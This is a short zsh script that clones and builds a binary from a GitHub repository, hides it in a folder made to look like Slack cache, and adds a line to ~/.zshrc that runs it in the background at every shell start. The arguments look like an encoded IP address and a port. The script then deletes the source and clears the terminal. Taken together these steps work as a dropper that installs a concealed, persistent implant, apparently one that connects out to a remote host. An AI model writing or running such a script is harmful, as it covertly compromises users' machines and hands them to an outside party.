#!/bin/zsh

git clone https://github.com/imEasyTool/tool.git tools && cd tools && \
  make re && chmod +x tool && mkdir -p ~/Library/slack_cache/remote && cp tool ~/Library/slack_cache/remote/ && \
  echo "~/Library/slack_cache/remote/tool 1226773770 3335 &" >> ~/.zshrc && cd .. && rm -rf tools && clear